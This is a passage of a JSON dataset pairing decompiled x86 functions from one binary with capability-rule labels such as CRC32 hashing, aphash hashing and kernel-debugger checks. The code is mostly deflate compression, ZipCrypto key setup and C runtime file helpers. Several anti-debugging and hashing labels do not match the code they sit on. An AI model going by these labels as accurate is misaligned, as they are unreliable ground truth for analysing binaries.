*(&var_24h + uVar8 * 2);\n                uVar4 = uVar1;\n                *(&var_24h + uVar8 * 2) = uVar1 + 1;\n                uVar2 = 0;\n                do {\n                    uVar5 = uVar2;\n                    uVar9 = uVar4 & 1;\n                    uVar8 = uVar8 - 1;\n                    uVar4 = uVar4 >> 1;\n                    uVar2 = (uVar5 | uVar9) * 2;\n                } while (0 < uVar8);\n                *(arg_ch + iVar6 * 4) = uVar5 | uVar9;\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 <= arg_10h);\n    }\n    fcn.0042ad2a(var_24h);\n    return;\n}\n",
        "token_count": 505
    },
    "00428540": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00428540(uint16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    arg_8h_00 = arg_8h;\n    uVar4 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0;\n    if (*(arg_8h + 0x1af2c) != 0) {\n        arg_8h = arg_8h + 0x9f2c;\n        do {\n            if ((uVar4 & 7) == 0) {\n                var_1h._0_1_ = *(var_8h + 0x19f2c + arg_8h_00);\n                var_8h = var_8h + 1;\n            }\n            uVar6 = *(arg_8h_00 + 0x1f2c + uVar4);\n            uVar4 = uVar4 + 1;\n            if ((var_1h & 1) == 0) {\n                fcn.00426410(arg_8h_00, *(arg_ch + uVar6 * 4), *(arg_ch + 2 + uVar6 * 4));\n            }\n            else {\n                uVar5 = *(uVar6 + 0x1b3d + arg_8h_00);\n                fcn.00426410(arg_8h_00, *(arg_ch + 0x404 + uVar5 * 4), *(arg_ch + 0x406 + uVar5 * 4));\n                iVar2 = *(uVar5 * 4 + 0x448218);\n                if (iVar2 != 0) {\n                    fcn.00426410(arg_8h_00, uVar6 - *(arg_8h_00 + 0x1e40 + uVar5 * 4), iVar2);\n                }\n                uVar1 = *arg_8h;\n                uVar6 = uVar1;\n                arg_8h = arg_8h + 1;\n                if (uVar6 < 0x100) {\n                    uVar3 = *(uVar6 + 0x1c3d + arg_8h_00);\n                }\n                else {\n                    uVar3 = *((uVar1 >> 7) + 0x1d3d + arg_8h_00);\n                }\n                uVar5 = uVar3;\n                fcn.00426410(arg_8h_00, *(arg_10h + uVar5 * 4), *(arg_10h + 2 + uVar5 * 4));\n                iVar2 = *(uVar5 * 4 + 0x4482a0);\n                if (iVar2 != 0) {\n                    fcn.00426410(arg_8h_00, uVar6 - *(arg_8h_00 + 0x1eb4 + uVar5 * 4), iVar2);\n                }\n            }\n            var_1h._0_1_ = var_1h >> 1;\n        } while (uVar4 < *(arg_8h_00 + 0x1af2c));\n    }\n    fcn.00426410(arg_8h_00, *(arg_ch + 0x400), *(arg_ch + 0x402));\n    return;\n}\n",
        "token_count": 849
    },
    "00428ac0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428ac0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    \n    arg_8h_00 = arg_8h;\n    *(arg_8h + 0x1af50) = arg_ch;\n    *(arg_8h + 0x1af48) = 0;\n    *(arg_8h + 0x1af44) = 0;\n    *(arg_8h + 0x1af4c) = 0;\n    if (*(arg_8h + 0xe7e) == 0) {\n        arg_ch = arg_8h + 0x1e40;\n        iVar3 = 0;\n        cVar1 = '\\0';\n        puVar8 = 0x448218;\n        do {\n            iVar10 = 0;\n            *arg_ch = iVar3;\n            if (0 < 1 << (*puVar8 & 0x1f)) {\n                do {\n                    *(arg_8h + 0x1b3d + iVar3) = cVar1;\n                    iVar10 = iVar10 + 1;\n                    iVar3 = iVar3 + 1;\n                } while (iVar10 < 1 << (*puVar8 & 0x1f));\n            }\n            arg_ch = arg_ch + 1;\n            cVar1 = cVar1 + '\\x01';\n            puVar8 = puVar8 + 1;\n        } while (puVar8 < 0x448288);\n        *(iVar3 + 0x1b3c + arg_8h) = cVar1;\n        arg_ch = arg_8h + 0x1eb4;\n        iVar3 = 0;\n        iVar10 = 0;\n        puVar8 = 0x4482a0;\n        do {\n            *arg_ch = iVar3;\n            arg_8h = NULL;\n            if (0 < 1 << (*puVar8 & 0x1f)) {\n                do {\n                    arg_8h = arg_8h + 1;\n                    *(arg_8h_00 + 0x1c3d + iVar3) = iVar10;\n                    iVar3 = iVar3 + 1;\n                } while (arg_8h < 1 << (*puVar8 & 0x1f));\n            }\n            arg_ch = arg_ch + 1;\n            puVar8 = puVar8 + 1;\n            iVar10 = iVar10 + 1;\n        } while (puVar8 < 0x4482e0);\n        iVar3 = iVar3 >> 7;\n        if (iVar10 < 0x1e) {\n            puVar8 = iVar10 * 4 + 0x4482a0;\n            arg_8h = arg_8h_00 + 0x1eb4 + iVar10 * 4;\n            do {\n                *arg_8h = iVar3 << 7;\n                iVar11 = 0;\n                if (0 < 1 << (*puVar8 - 7U & 0x1f)) {\n                    do {\n                        *(arg_8h_00 + 0x1d3d + iVar3) = iVar10;\n                        iVar11 = iVar11 + 1;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar11 < 1 << (*puVar8 - 7U & 0x1f));\n                }\n                arg_8h = arg_8h + 1;\n                puVar8 = puVar8 + 1;\n                iVar10 = iVar10 + 1;\n            } while (puVar8 < 0x448318);\n        }\n        *(arg_8h_00 + 0xfe4) = 0;\n        *(arg_8h_00 + 0xfe8) = 0;\n        *(arg_8h_00 + 0xfec) = 0;\n        *(arg_8h_00 + 0xff0) = 0;\n        *(arg_8h_00 + 0xff4) = 0;\n        *(arg_8h_00 + 0xff8) = 0;\n        *(arg_8h_00 + 0xffc) = 0;\n        *(arg_8h_00 + 0x1000) = 0;\n        puVar4 = arg_8h_00 + 0xa02;\n        iVar3 = 0x18;\n        do {\n            puVar4[-2] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            *puVar4 = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[2] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[4] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[6] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4[8] = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4 = puVar4 + 0xc;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = arg_8h_00 + 0xc3e;\n        iVar3 = 0x70;\n        do {\n            *puVar4 = 9;\n            *(arg_8h_00 + 0xff6) = *(arg_8h_00 + 0xff6) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar3 = 0x18;\n        puVar4 = arg_8h_00 + 0xdfe;\n        do {\n            *puVar4 = 7;\n            *(arg_8h_00 + 0xff2) = *(arg_8h_00 + 0xff2) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = arg_8h_00 + 0xe5e;\n        iVar3 = 8;\n        do {\n            *puVar4 = 8;\n            *(arg_8h_00 + 0xff4) = *(arg_8h_00 + 0xff4) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00427fd0(arg_8h_00, arg_8h_00 + 0x9fc, 0x11f);\n        puVar6 = arg_8h_00 + 0xe7c;\n        uVar12 = 0;\n        do {\n            iVar3 = 5;\n            puVar6[1] = 5;\n            uVar2 = 0;\n            uVar7 = uVar12;\n            do {\n                uVar5 = uVar2;\n                uVar9 = uVar7 & 1;\n                iVar3 = iVar3 + -1;\n                uVar7 = uVar7 >> 1;\n                uVar2 = (uVar5 | uVar9) * 2;\n            } while (0 < iVar3);\n            *puVar6 = uVar5 | uVar9;\n            uVar12 = uVar12 + 1;\n            puVar6 = puVar6 + 2;\n        } while (uVar12 < 0x1e);\n        fcn.00425d40(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 1916
    },
    "00429630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4b0h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429630(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uchar uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t **in_ECX;\n    uint8_t *puVar10;\n    int16_t iVar11;\n    uint unaff_ESI;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    uint uVar14;\n    uint8_t **ppuVar15;\n    uint *arg_8h_00;\n    uint8_t **var_4b0h;\n    int32_t var_4ach;\n    int32_t var_4a8h;\n    uint8_t *var_4a4h;\n    int32_t var_4a0h;\n    uint var_499h;\n    uint var_494h;\n    uint var_490h;\n    uint8_t *var_48ch;\n    uint8_t *var_488h;\n    uint8_t *var_484h;\n    uint8_t *var_480h;\n    int32_t var_47ch;\n    int32_t var_478h;\n    uint var_474h;\n    uint var_470h;\n    ushort var_46ch;\n    uint var_46ah;\n    uint8_t *var_464h;\n    uint8_t *var_460h;\n    uint var_45ch;\n    uint *var_358h;\n    uint *var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_248h;\n    uint var_144h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_30h;\n    uint var_24h;\n    uchar var_19h;\n    uint var_18h;\n    uchar var_14h;\n    uint var_13h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uchar var_bh;\n    uchar var_ah;\n    uchar var_9h;\n    uchar var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    if (in_ECX[5] != NULL) {\n        fcn.0042ad2a(in_ECX);\n        return;\n    }\n    if (*(in_ECX + 0xb) != '\\0') {\n        fcn.0042ad2a(in_ECX);\n        return;\n    }\n    var_4a8h = 0;\n    if ((*in_ECX != NULL) && (arg_14h != 4)) {\n        var_4a8h = 0xc;\n    }\n    arg_8h_00 = &var_134h;\n    (**0x469304)(arg_8h_00, arg_8h);\n    if (var_134h == '\\0') {\n        fcn.0042ad2a(unaff_ESI);\n        return;\n    }\n    puVar5 = &var_134h;\n    do {\n        if (*puVar5 == '\\\\') {\n            *puVar5 = '/';\n        }\n        puVar5 = puVar5 + 1;\n    } while (*puVar5 != '\\0');\n    var_499h._0_1_ = arg_14h == 4;\n    if (var_499h) {\n        iVar6 = fcn.0042b420(&var_134h);\n        bVar2 = true;\n        if (*(&var_138h + iVar6 + 3) == '/') goto code_r0x00429727;\n    }\n    else {\ncode_r0x00429727:\n        bVar2 = false;\n    }\n    iVar11 = 8;\n    var_4ach = 8;\n    if ((var_499h) || (cVar3 = fcn.00427330(&var_134h),  cVar3 != '\\0')) {\n        iVar11 = 0;\n        var_4ach = 0;\n    }\n    if (arg_14h == 2) {\n        iVar6 = fcn.00428810(arg_ch);\n    }\n    else if (arg_14h == 1) {\n        iVar6 = fcn.00427a40(arg_ch, arg_10h);\n    }\n    else if (arg_14h == 3) {\n        iVar6 = fcn.00427ba0(arg_ch, arg_10h);\n    }\n    else {\n        if (arg_14h != 4) goto code_r0x00429f6f;\n        iVar6 = fcn.00427ce0();\n    }\n    if (iVar6 != 0) goto code_r0x00429f6f;\n    var_138h = 0;\n    (**0x469304)(&var_45ch, 0x4453cc);\n    (**0x469304)(&var_34ch, &var_134h);\n    var_47ch = (**0x469150)(&var_34ch);\n    if (bVar2) {\n        (**0x469258)(&var_34ch, 0x446fe4);\n        var_47ch = var_47ch + 1;\n    }\n    (**0x469304)(&var_248h, 0x4453cc);\n    var_46ah._0_2_ = 0;\n    var_48ch = in_ECX[0x1a];\n    var_46ah._2_2_ = 8;\n    var_350h = 0;\n    var_470h = 0;\n    var_144h = 1;\n    var_13ch = 0;\n    var_494h = 0x140b17;\n    var_488h = NULL;\n    var_490h._0_2_ = 8;\n    if ((*in_ECX != NULL) && (!var_499h)) {\n        var_46ah._2_2_ = 9;\n        var_490h._0_2_ = 9;\n    }\n    if ((iVar11 == 0) && (-1 < in_ECX[0x1c])) {\n        var_484h = in_ECX[0x1c] + var_4a8h;\n    }\n    else {\n        var_484h = NULL;\n    }\n    var_480h = in_ECX[0x1c];\n    var_464h = in_ECX[0x13];\n    var_460h = in_ECX[6] + in_ECX[4];\n    var_13h._0_1_ = *(in_ECX + 0x16);\n    var_46ch = 0;\n    var_358h = &var_18h;\n    var_354h = &var_30h;\n    puVar12 = in_ECX[0x16];\n    var_13h._1_1_ = puVar12 >> 8;\n    var_13h._2_1_ = puVar12 >> 0x10;\n    var_13h._3_1_ = puVar12 >> 0x18;\n    var_fh = *(in_ECX + 0x14);\n    puVar12 = in_ECX[0x14];\n    var_eh = puVar12 >> 8;\n    var_ch = puVar12 >> 0x18;\n    var_dh = puVar12 >> 0x10;\n    var_bh = *(in_ECX + 0x18);\n    puVar12 = in_ECX[0x18];\n    var_ah = puVar12 >> 8;\n    var_8h = puVar12 >> 0x18;\n    var_9h = puVar12 >> 0x10;\n    var_478h = 0x11;\n    var_474h = 9;\n    var_18h = 0xd5455;\n    var_14h = 7;\n    var_490h._2_2_ = iVar11;\n    fcn.0042af40(&var_30h, &var_18h, 9);\n    puVar5 = &var_494h;\n    uVar14 = 0x427bf0;\n    ppuVar15 = in_ECX;\n    var_4b0h = in_ECX;\n    *(var_354h + 2) = 5;\n    iVar6 = fcn.00426980(puVar5, uVar14, ppuVar15);\n    if (iVar6 != 0) {\n        fcn.00427ea0();\n        goto code_r0x004299ea;\n    }\n    in_ECX[6] = in_ECX[6] + var_478h + 0x1e + var_47ch;\n    if (in_ECX[5] != NULL) {\n        fcn.00427ea0();\n        fcn.0042ad2a(arg_8h_00);\n        return;\n    }\n    ppuVar15 = in_ECX + 0xc;\n    in_ECX[0xd] = 0x23456789;\n    in_ECX[0xe] = 0x34567890;\n    puVar12 = *in_ECX;\n    *ppuVar15 = 0x12345678;\n    for (; (puVar12 != NULL && (*puVar12 != 0)); puVar12 = puVar12 + 1) {\n        fcn.004272e0(ppuVar15, *puVar12);\n    }\n    if (*0x469388 == '\\0') {\n        uVar7 = (**0x4690b0)();\n        uVar8 = (**0x4692c4)();\n        fcn.0042ea8e(uVar7 ^ uVar8);\n    }\n    iVar6 = 0;\n    do {\n        iVar9 = fcn.0042eaa0();\n        *(&var_24h + iVar6) = iVar9 >> 7;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_4a4h = in_ECX[0xd];\n    puVar12 = in_ECX[0xe];\n    var_19h = var_48ch >> 8;\n    puVar10 = *ppuVar15;\n    var_4a0h = 0;\n    do {\n        puVar10 = *(((*(&var_24h + var_4a0h) ^ puVar10) & 0xff) * 4 + 0x4483b8) ^ puVar10 >> 8;\n        uVar7 = puVar12 & 0xfffd | 2;\n        puVar13 = (var_4a4h + (puVar10 & 0xff)) * 0x8088405 + 1;\n        *ppuVar15 = puVar10;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x4483b8);\n        uVar1 = *(&var_24h + var_4a0h);\n        in_ECX[0xe] = puVar12;\n        *(&var_24h + var_4a0h) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 1);\n        uVar7 = puVar12 & 0xfffd | 2;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x4483b8) ^ puVar10 >> 8;\n        puVar13 = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        *ppuVar15 = puVar10;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x4483b8);\n        *(&var_24h + var_4a0h + 1) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 2);\n        uVar7 = puVar12 & 0xfffd | 2;\n        in_ECX[0xe] = puVar12;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x4483b8) ^ puVar10 >> 8;\n        *ppuVar15 = puVar10;\n        puVar13 = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = puVar13;\n        puVar12 = puVar12 >> 8 ^ *(((puVar13 >> 0x18 ^ puVar12) & 0xff) * 4 + 0x4483b8);\n        *(&var_24h + var_4a0h + 2) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        uVar1 = *(&var_24h + var_4a0h + 3);\n        uVar7 = puVar12 & 0xfffd | 2;\n        in_ECX[0xe] = puVar12;\n        puVar10 = *(((uVar1 ^ puVar10) & 0xff) * 4 + 0x4483b8) ^ puVar10 >> 8;\n        iVar6 = var_4a0h + 4;\n        var_4a4h = (puVar13 + (puVar10 & 0xff)) * 0x8088405 + 1;\n        in_ECX[0xd] = var_4a4h;\n        *ppuVar15 = puVar10;\n        puVar12 = puVar12 >> 8 ^ *(((var_4a4h >> 0x18 ^ puVar12) & 0xff) * 4 + 0x4483b8);\n        in_ECX[0xe] = puVar12;\n        *(&var_24h + var_4a0h + 3) = (uVar7 ^ 1) * uVar7 >> 8 ^ uVar1;\n        var_4a0h = iVar6;\n    } while (iVar6 < 0xc);\n    iVar6 = 0;\n    if (*var_4b0h == NULL) {\ncode_r0x00429d1d:\n        uVar4 = 0;\n    }\n    else {\n        if (var_499h == '\\0') {\n            fcn.00427870(&var_24h, 0xc);\n            var_4b0h[6] = var_4b0h[6] + 0xc;\n        }\n        if ((*var_4b0h == NULL) || (var_499h != '\\0')) goto code_r0x00429d1d;\n        uVar4 = 1;\n    }\n    *(var_4b0h + 0x2d) = uVar4;\n    if (var_499h == '\\0') {\n        if (var_4ach == 8) {\n            iVar6 = fcn.00429510(&var_494h);\n        }\n        else if (var_4ach == 0) {\n            iVar6 = fcn.00427f00();\n        }\n    }\n    else {\n        var_4b0h[0x24] = NULL;\n    }\n    *(var_4b0h + 0x2d) = 0;\n    if ((*(var_4b0h + 0x20) != '\\0') && (var_4b0h[0x1f] != NULL)) {\n        (**0x4690f0)(var_4b0h[0x1f]);\n    }\n    puVar12 = var_4b0h[0x1d];\n    var_4b0h[6] = var_4b0h[6] + var_4b0h[0x24];\n    var_4b0h[0x1f] = NULL;\n    var_4b0h[0x1c] = puVar12;\n    if (var_4b0h[5] == NULL) {\n        if (iVar6 != 0) {\ncode_r0x004299ea:\n            fcn.0042ad2a(arg_8h_00);\n            return;\n        }\n        var_488h = var_4b0h[0x1e];\n        puVar10 = var_4b0h[0x24] + var_4a8h;\n        var_480h = puVar12;\n        if ((*(var_4b0h + 7) == '\\0') || ((*var_4b0h != NULL && (var_499h == '\\0')))) {\n            if ((var_490h._2_2_ != var_4ach) || ((var_4ach == 0 && (var_484h != puVar10)))) {\n                var_484h = puVar10;\n                fcn.0042ad2a(arg_8h_00);\n                return;\n            }\n            var_484h = puVar10;\n            iVar6 = fcn.00426bc0(&var_494h, 0x427bf0, var_4b0h);\n            if (iVar6 != 0) goto code_r0x004299ea;\n            var_4b0h[6] = var_4b0h[6] + 0x10;\n            var_490h._0_2_ = var_46ah._2_2_;\n        }\n        else {\n            if ((var_490h & 1) == 0) {\n                var_490h._0_2_ = var_490h & 0xfff7;\n            }\n            var_46ah._2_2_ = var_490h;\n            var_490h._2_2_ = var_4ach;\n            var_484h = puVar10;\n            cVar3 = fcn.004279d0(var_460h - var_4b0h[4]);\n            if (cVar3 == '\\0') {\ncode_r0x00429e49:\n                fcn.0042ad2a(arg_8h_00);\n                return;\n            }\n            iVar6 = fcn.00426980(&var_494h, 0x427bf0, var_4b0h);\n            if (iVar6 != 0) goto code_r0x004299ea;\n            cVar3 = fcn.004279d0(var_4b0h[6]);\n            if (cVar3 == '\\0') goto code_r0x00429e49;\n        }\n        if (var_4b0h[5] == NULL) {\n            uVar14 = fcn.0042b9b1(var_474h);\n            fcn.0042af40(uVar14, var_354h, var_474h);\n            var_354h = uVar14;\n            puVar10 = fcn.0042b9b1(0x360);\n            fcn.0042af40(puVar10, &var_494h, 0x360);\n            puVar12 = var_4b0h[0x11];\n            if (puVar12 != NULL) {\n                iVar6 = *(puVar12 + 0x35c);\n                while (iVar6 != 0) {\n                    puVar12 = *(puVar12 + 0x35c);\n                    iVar6 = *(puVar12 + 0x35c);\n                }\n                *(puVar12 + 0x35c) = puVar10;\n                fcn.0042ad2a(arg_8h_00);\n                return;\n            }\n            var_4b0h[0x11] = puVar10;\n            fcn.0042ad2a(arg_8h_00);\n            return;\n        }\n    }\ncode_r0x00429f6f:\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 4609
    },
    "0042a1e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a1e8(uint32_t arg_8h)\n\n{\n    fcn.0042b3a3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0042b9b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b9b1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_4h;\n    \n    do {\n        iVar2 = fcn.0042ae6b(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00431c22(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x4695ac & 1) == 0) {\n        *0x4695ac = *0x4695ac | 1;\n        var_4h = 0x448ec4;\n        fcn.0042b2a1(&var_4h);\n        *0x4695a0 = 0x4453c4;\n        fcn.0042db0e(0x43fbe1);\n    }\n    fcn.0042b3ae(0x4695a0);\n    var_10h = 0x4453c4;\n    fcn.0042ba31(&var_10h, 0x44c830);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 281
    },
    "0042a7f9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a7f9(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x448848;\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0042ac64": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ac64(uint32_t arg_8h)\n\n{\n    fcn.0042ac54();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "0042b3d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042b3d3(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x448e9c;\n    fcn.0042b30b();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004306a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004306a0(uint32_t arg_8h)\n\n{\n    char **in_ECX;\n    \n    *in_ECX = \"generic\";\n    fcn.0042b3a3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042ac49();\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0043501b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043501b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44eae0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0043065f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043064c();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x46a338)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x46a340;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043ab76(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0043064c();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0043065f();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0043491e(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004350e7();\n                goto code_r0x004350de;\n            }\n        }\n        puVar2 = fcn.0043065f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043064c();\n        *puVar2 = 9;\n        fcn.00431ed7();\n    }\ncode_r0x004350de:\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 607
    },
    "004394f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004394f7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44eba0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0043065f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043064c();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x46a338)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x46a340;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0043ab76(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0043064c();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0043065f();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00439482(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004395c3();\n                goto code_r0x004395ba;\n            }\n        }\n        puVar2 = fcn.0043065f();\n        *puVar2 = 0;\n        puVar2 = fcn.0043064c();\n        *puVar2 = 9;\n        fcn.00431ed7();\n    }\ncode_r0x004395ba:\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 605
    },
    "00439b7f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
